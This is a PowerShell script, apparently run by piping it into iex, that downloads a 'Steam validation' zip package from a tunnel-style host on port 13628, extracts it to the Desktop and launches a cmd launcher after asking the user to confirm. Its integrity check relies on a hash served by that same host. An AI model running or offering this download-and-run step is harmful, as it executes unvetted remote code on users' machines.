param(
    [ValidatePattern('^[a-z0-9][a-z0-9-]{0,63}$')]
    [string]$Package = 'steam-validation-20261002-fix3'
)

# All session variables and functions stay in this child scope, including when run with irm | iex.
& {
    param($Package)
    $ErrorActionPreference = 'Stop'
    Set-StrictMode -Version Latest

    function Initialize-WebShareProcessType {
        if ('WebShare.TestProcess' -as [type]) { return }
        Add-Type -TypeDefinition @'
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace WebShare
{
    public sealed class TestProcess : IDisposable
    {
        private const uint KillOnJobClose = 0x2000;
        private IntPtr _job;
        public uint ProcessId { get; private set; }

        [StructLayout(LayoutKind.Sequential)]
        private struct BasicLimits
        {
            public long ProcessTime, JobTime;
            public uint Flags;
            public UIntPtr MinWorkingSet, MaxWorkingSet;
            public uint ActiveLimit;
            public UIntPtr Affinity;
            public uint Priority, Scheduling;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct IoCounters { public ulong ReadOps, WriteOps, OtherOps, ReadBytes, WriteBytes, OtherBytes; }
        [StructLayout(LayoutKind.Sequential)]
        private struct ExtendedLimits
        {
            public BasicLimits Basic;
            public IoCounters Io;
            public UIntPtr ProcessMemory, JobMemory, PeakProcessMemory, PeakJobMemory;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct Accounting
        {
            public long UserTime, KernelTime, PeriodUserTime, PeriodKernelTime;
            public uint PageFaults, TotalProcesses, ActiveProcesses, TerminatedProcesses;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct StartupInfo
        {
            public int Size;
            public string Reserved, Desktop, Title;
            public uint X, Y, XSize, YSize, XChars, YChars, Fill, Flags;
            public short Show, ReservedSize;
            public IntPtr ReservedPointer, Input, Output, Error;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct ProcessInfo { public IntPtr Process, Thread; public uint ProcessId, ThreadId; }
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateJobObject(IntPtr attributes, string name);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetInformationJobObject(IntPtr job, int type, ref ExtendedLimits info, uint length);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool QueryInformationJobObject(IntPtr job, int type, out Accounting info, uint length, IntPtr returnedLength);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AssignProcessToJobObject(IntPtr job, IntPtr process);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateJobObject(IntPtr job, uint exitCode);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool CreateProcess(string application, StringBuilder command, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint flags, IntPtr environment, string directory, ref StartupInfo startup, out ProcessInfo process);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr thread);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr process, uint exitCode);
        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr handle);

        public TestProcess(string launcher, string directory)
        {
            _job = CreateJobObject(IntPtr.Zero, null);
            if (_job == IntPtr.Zero) throw new Win32Exception();
            var process = new ProcessInfo();
            bool assigned = false;
            try
            {
                var limits = new ExtendedLimits();
                limits.Basic.Flags = KillOnJobClose;
                if (!SetInformationJobObject(_job, 9, ref limits, (uint)Marshal.SizeOf(typeof(ExtendedLimits)))) throw new Win32Exception();
                var startup = new StartupInfo();
                startup.Size = Marshal.SizeOf(typeof(StartupInfo));
                var cmd = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");
                var command = new StringBuilder("\"" + cmd + "\" /d /s /c \"\"" + launcher + "\"\"");
                if (!CreateProcess(cmd, command, IntPtr.Zero, IntPtr.Zero, false, 0x08000004, IntPtr.Zero, directory, ref startup, out process)) throw new Win32Exception();
                if (!AssignProcessToJobObject(_job, process.Process)) throw new Win32Exception();
                assigned = true;
                ProcessId = process.ProcessId;
                if (ResumeThread(process.Thread) == UInt32.MaxValue) throw new Win32Exception();
            }
            catch
            {
                try
                {
                    if (!assigned && process.Process != IntPtr.Zero && !TerminateProcess(process.Process, 1)) throw new Win32Exception();
                }
                finally { Dispose(); }
                throw;
            }
            finally
            {
                if (process.Thread != IntPtr.Zero) CloseHandle(process.Thread);
                if (process.Process != IntPtr.Zero) CloseHandle(process.Process);
            }
        }

        public void Stop()
        {
            if (_job == IntPtr.Zero) return;
            if (!TerminateJobObject(_job, 0)) throw new Win32Exception();
            var watch = Stopwatch.StartNew();
            while (true)
            {
                Accounting info;
                if (!QueryInformationJobObject(_job, 1, out info, (uint)Marshal.SizeOf(typeof(Accounting)), IntPtr.Zero)) throw new Win32Exception();
                if (info.ActiveProcesses == 0) return;
                if (watch.Elapsed.TotalSeconds > 10) throw new TimeoutException("The test process tree did not exit.");
                Thread.Sleep(100);
            }
        }

        public void Dispose()
        {
            if (_job != IntPtr.Zero) { CloseHandle(_job); _job = IntPtr.Zero; }
        }
    }
}
'@
    }

    function Expand-WebShareArchive {
        param([string]$ArchivePath, [string]$GameDirectory)
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $root = [IO.Path]::GetFullPath($GameDirectory).TrimEnd('\') + '\'
        $archive = [IO.Compression.ZipFile]::OpenRead($ArchivePath)
        try {
            # Validate every destination before extracting any archive entry.
            foreach ($entry in $archive.Entries) {
                $name = $entry.FullName.Replace('/', '\')
                if ([IO.Path]::IsPathRooted($name) -or $name.Contains(':')) { throw 'The archive contains an absolute path.' }
                $target = [IO.Path]::GetFullPath([IO.Path]::Combine($root, $name))
                if (-not $target.StartsWith($root, [StringComparison]::OrdinalIgnoreCase)) { throw 'The archive contains a path outside the install directory.' }
                if ((($entry.ExternalAttributes -shr 16) -band 0xf000) -eq 0xa000 -or ($entry.ExternalAttributes -band 0x400) -ne 0) { throw 'Links are not allowed in a test archive.' }
            }
            [IO.Compression.ZipFile]::ExtractToDirectory($ArchivePath, $GameDirectory)
        }
        finally { $archive.Dispose() }
    }

    function Assert-WebShareOwnedDirectory {
        param([string]$InstallDirectory, [string]$DesktopDirectory)
        $full = [IO.Path]::GetFullPath($InstallDirectory).TrimEnd('\')
        $desktop = [IO.Path]::GetFullPath($DesktopDirectory).TrimEnd('\')
        if (-not [string]::Equals([IO.Path]::GetDirectoryName($full), $desktop, [StringComparison]::OrdinalIgnoreCase) -or [IO.Path]::GetFileName($full) -notmatch '^WebShare-Test-[a-z0-9-]+-[a-f0-9]{32}$') {
            throw 'Refusing to clean a directory outside this test session.'
        }
        if (-not (Test-Path -LiteralPath $full)) { return }
        $stack = New-Object 'System.Collections.Generic.Stack[string]'
        $stack.Push($full)
        while ($stack.Count -gt 0) {
            $directory = $stack.Pop()
            if (((Get-Item -LiteralPath $directory -Force).Attributes -band [IO.FileAttributes]::ReparsePoint) -ne 0) { throw 'Refusing cleanup through a directory link.' }
            foreach ($item in Get-ChildItem -LiteralPath $directory -Force) {
                if (($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -ne 0) { throw 'Refusing cleanup of a directory containing links.' }
                if ($item.PSIsContainer) { $stack.Push($item.FullName) }
            }
        }
    }

    function Remove-WebShareSession {
        param([string]$InstallDirectory, [string]$DesktopDirectory, [string]$Token)
        if (-not (Test-Path -LiteralPath $InstallDirectory)) { return }
        Assert-WebShareOwnedDirectory $InstallDirectory $DesktopDirectory
        $marker = Get-Content -LiteralPath (Join-Path $InstallDirectory '.webshare-session.json') -Raw | ConvertFrom-Json
        if ($marker.token -cne $Token -or -not $InstallDirectory.EndsWith('-' + $Token, [StringComparison]::Ordinal)) { throw 'The session ownership marker does not match.' }
        for ($attempt = 0; $attempt -lt 5; $attempt++) {
            try {
                if (-not (Test-Path -LiteralPath $InstallDirectory)) { return }
                # Recheck paths and links even on retries after a partially completed deletion.
                Assert-WebShareOwnedDirectory $InstallDirectory $DesktopDirectory
                Remove-Item -LiteralPath $InstallDirectory -Recurse -Force -ErrorAction Stop
                return
            }
            catch {
                if ($attempt -eq 4) { throw }
                Start-Sleep -Milliseconds 500
            }
        }
    }

    function Invoke-WebShareSession {
        param([uri]$ReleaseUri, [string]$DesktopDirectory)
        if ([Environment]::OSVersion.Platform -ne [PlatformID]::Win32NT -or -not [Environment]::Is64BitOperatingSystem) { throw 'This test package requires Windows x64.' }
        if (-not [Environment]::Is64BitProcess) { throw 'Please run the 64-bit Windows PowerShell or PowerShell terminal.' }
        if ($ReleaseUri.Scheme -ne 'https') { throw 'A trusted HTTPS release URL is required.' }
        if ([string]::IsNullOrWhiteSpace($DesktopDirectory) -or -not (Test-Path -LiteralPath $DesktopDirectory -PathType Container)) { throw 'The desktop directory is unavailable.' }
        $release = Invoke-RestMethod -Uri $ReleaseUri -TimeoutSec 30
        if ($release.id -notmatch '^[a-z0-9][a-z0-9-]{0,63}$' -or $release.installName -notmatch '^[a-z0-9-]{1,32}$' -or $release.sha256 -notmatch '^[a-fA-F0-9]{64}$' -or [long]$release.bytes -le 0) { throw 'Invalid release metadata.' }
        $archiveUri = [uri]::new($ReleaseUri, [string]$release.file)
        if ($archiveUri.Scheme -ne 'https' -or $archiveUri.Authority -ne $ReleaseUri.Authority) { throw 'The package URL must use the same HTTPS host.' }
        if ($release.launcher -ne 'Start-NetworkValidation.cmd') { throw 'Unsupported package launcher.' }
        $token = [guid]::NewGuid().ToString('N')
        $installDirectory = Join-Path $DesktopDirectory ('WebShare-Test-' + $release.installName + '-' + $token)
        Write-Host ''
        Write-Host ('Package: ' + $release.title)
        Write-Host ('Download: {0:N1} MiB' -f ([long]$release.bytes / 1MB))
        Write-Host ('Install directory: ' + $installDirectory)
        Write-Host 'Steam must already be running and signed in.'
        Write-Host 'After launch, keep this terminal open. Type Delete to stop this test and remove ALL its files, including logs.'
        Write-Host 'Windows/Steam caches outside this directory are not removed.'
        do { $answer = Read-Host 'Download, install and run? Type Yes or No' } while ($answer -notmatch '^(?i:yes|no)$')
        if ($answer -ieq 'No') { Write-Host 'Cancelled. No installation files were created.'; return }

        $process = $null
        $created = $false
        $bodyError = $null
        try {
            if (Test-Path -LiteralPath $installDirectory) { throw 'The generated install directory already exists.' }
            New-Item -ItemType Directory -Path $installDirectory -ErrorAction Stop | Out-Null
            $created = $true
            [IO.File]::WriteAllText((Join-Path $installDirectory '.webshare-session.json'), (@{ token = $token; release = $release.id } | ConvertTo-Json), [Text.UTF8Encoding]::new($false))
            $archivePath = Join-Path $installDirectory 'package.zip'
            Write-Host 'Downloading package...'
            Invoke-WebRequest -Uri $archiveUri -OutFile $archivePath -UseBasicParsing -TimeoutSec 3600
            if ((Get-Item -LiteralPath $archivePath).Length -ne [long]$release.bytes) { throw 'Downloaded package size does not match.' }
            if ((Get-FileHash -LiteralPath $archivePath -Algorithm SHA256).Hash -ine $release.sha256) { throw 'SHA-256 verification failed. The package will not run.' }
            $gameDirectory = Join-Path $installDirectory 'game'
            Write-Host 'Verified. Extracting...'
            Expand-WebShareArchive $archivePath $gameDirectory
            Remove-Item -LiteralPath $archivePath -Force
            $launcher = Join-Path $gameDirectory $release.launcher
            if (-not (Test-Path -LiteralPath $launcher -PathType Leaf)) { throw 'The root launcher was not found.' }
            Initialize-WebShareProcessType
            $process = [WebShare.TestProcess]::new($launcher, $gameDirectory)
            Write-Host ''
            Write-Host 'The test launcher has started. This terminal stays open until cleanup.' -ForegroundColor Green
            Write-Host ('Game files and logs: ' + $gameDirectory)
            Write-Host 'Collect any logs you need BEFORE typing Delete. Closing the game does not clean its files.'
            do { $command = Read-Host 'When testing is finished, type Delete to stop and remove this installation' } while ($command -ine 'Delete')
        }
        catch {
            $bodyError = $_
            Write-Host ('Test session failed: ' + $_.Exception.Message) -ForegroundColor Red
        }
        finally {
            $stopped = $true
            if ($null -ne $process) {
                try { $process.Stop() }
                catch { $stopped = $false; Write-Host ('Could not confirm test processes stopped: ' + $_.Exception.Message) -ForegroundColor Red }
                finally { $process.Dispose() }
            }
            if ($created -and $stopped) {
                try {
                    Remove-WebShareSession $installDirectory $DesktopDirectory $token
                    Write-Host 'Cleanup complete. This installation and its downloaded archive have been removed.' -ForegroundColor Green
                }
                catch { Write-Host ('Cleanup incomplete. Remaining directory: ' + $installDirectory + '. ' + $_.Exception.Message) -ForegroundColor Red; throw }
            }
            elseif ($created) { throw ('Cleanup not completed. Check remaining files at: ' + $installDirectory) }
        }
        if ($null -ne $bodyError) { throw $bodyError }
    }

    # No execution-policy change, administrator elevation, scheduled task or startup registration.
    $baseUrl = 'https://www.h6968de49.nyat.app:13628/downloads/releases/'
    Invoke-WebShareSession -ReleaseUri ($baseUrl + $Package + '.json') -DesktopDirectory ([Environment]::GetFolderPath('DesktopDirectory'))
} $Package
